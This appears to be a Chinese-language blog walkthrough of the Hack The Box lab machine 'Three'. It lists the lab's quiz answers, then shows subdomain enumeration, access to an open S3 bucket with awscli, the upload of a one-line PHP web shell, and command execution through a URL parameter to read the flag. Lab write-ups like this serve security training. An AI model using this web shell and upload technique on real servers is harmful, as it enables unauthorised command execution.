---
title: HackBox---Three
date: 2022-11-21 20:42:20
author: ReadPond
tags:
- HackBox
categories:
- 靶场
keywords: 
top: true
index_img: /img/202302091327883.png
banner_img: /img/202302091327883.png
---

### Three

##### 一、问题

```
How many TCP ports are open?
	2
What is the domain of the email address provided in the "Contact" section of the website?
	thetoppers.htb
In the absence of a DNS server, which Linux file can we use to resolve hostnames to IP addresses in order to be able to access the websites that point to those hostnames?
	/etc/hosts
Which sub-domain is discovered during further enumeration?
	s3.thetoppers.htb
Which service is running on the discovered sub-domain?
	Amazon S3
Which command line utility can be used to interact with the service running on the discovered sub-domain?
	awscli
Which command is used to set up the AWS CLI installation?
	aws configure
What is the command used by the above utility to list all of the S3 buckets?
	aws s3 ls
This server is configured to run files written in what web scripting language?
	PHP
```

##### 二、获取Flag

先对靶机IP进行端口扫描查看开放哪些端口

![image-20230211200724185](https://cdn.jsdelivr.net/gh/ROFGD/Drawingbed/202302112007484.png)

火狐浏览器访问该IP地址，在网页当中找到一个域名`thetoppers.htb`

![image-20230211200913528](https://cdn.jsdelivr.net/gh/ROFGD/Drawingbed/202302112009222.png)

使用OneForAll进行子域名爆破找到其中一个子域名`s3.thetoppers.htb`

在没有 DNS 服务器的情况下，我们可以使用Hosts文件将主机名解析为 IP 地址，以便能够访问指向这些主机名的网站

```
echo '10.129.192.178 thetoppers.htb' >> /etc/hosts
echo '10.129.192.178 s3.thetoppers.htb' >> /etc/hosts
```

-   浏览器访问s3.thetoppers.htb

![image-20230211205257478](https://cdn.jsdelivr.net/gh/ROFGD/Drawingbed/202302112052435.png)

-   通过子域名爆破，得知该域名是使用亚马逊服务器，下载安装aws
-   使用`aws configure`进行配置

![image-20230211220937436](https://cdn.jsdelivr.net/gh/ROFGD/Drawingbed/202302112209728.png)

查看所有s3的服务

```
aws --endpoint=http://s3.thetoppers.htb s3 ls 
```



![image-20230211221044821](https://cdn.jsdelivr.net/gh/ROFGD/Drawingbed/202302112210680.png)

查看该s3下的目录及对象

```text
aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb
```

![image-20230211221152799](https://cdn.jsdelivr.net/gh/ROFGD/Drawingbed/202302112211583.png)

编写一句话木马，使用cp命令拷贝到s3的桶里，并查看结果

```
echo '<?php system($_GET["cmd"]); ?>' > shell.php
aws --endpoint=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb
```


![](https://cdn.jsdelivr.net/gh/ROFGD/Drawingbed/202302112214972.png)

![](https://cdn.jsdelivr.net/gh/ROFGD/Drawingbed/202302112214735.png)

-   使用`cmd=cat+../flag.txt`可以直接拿到flag

-   ```
    http://thetoppers.htb/shell.php?cmd=cat+../flag.txt
    ```


![](https://cdn.jsdelivr.net/gh/ROFGD/Drawingbed/202302112223189.png)
